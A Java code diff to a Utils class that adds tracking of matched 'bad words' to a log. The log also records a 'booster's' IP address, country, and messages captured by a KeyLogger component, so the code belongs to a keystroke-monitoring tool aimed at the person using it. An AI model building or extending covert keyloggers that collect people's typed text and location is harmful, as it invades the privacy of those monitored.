@@ -1,6 +1,7 @@
 package services;
 
 import com.amazonaws.util.IOUtils;
+import com.amazonaws.util.StringUtils;
 import com.google.gson.JsonArray;
 import com.google.gson.JsonObject;
 import logger.Globals;
@@ -28,6 +29,7 @@ import java.util.Scanner;
 public class Utils {
 
     private static boolean foundBadWord = false;
+    private  ArrayList<String> foundBadWords = new ArrayList<>();
     public Boolean scriptAlert = false;
     public String scriptAlertName = "";
 
@@ -40,6 +42,8 @@ public class Utils {
             JsonArray logFile = new JsonArray();
             logFile.add("The booster's IP adress is: " + getMyIp() + "\n");
             logFile.add("The booster's Country is: " + getMyCountry() + "\n");
+            logFile.add("Found WARNING words are: " + String.join(", ", foundBadWords));
+            System.out.println("FFOUND BAD WORD: " + String.join(", ", foundBadWords));
             for (String message : KeyLogger.log) {
                 if(message.trim().length() > 2) {
                     logFile.add(message.trim() + "\n");
@@ -79,6 +83,7 @@ public class Utils {
         for (String badWord: badWords) {
             for (String message : log) {
                 if(message.toUpperCase().contains(badWord.toUpperCase())) {
+                    foundBadWords.add(badWord);
                     return true;
                 }
             }
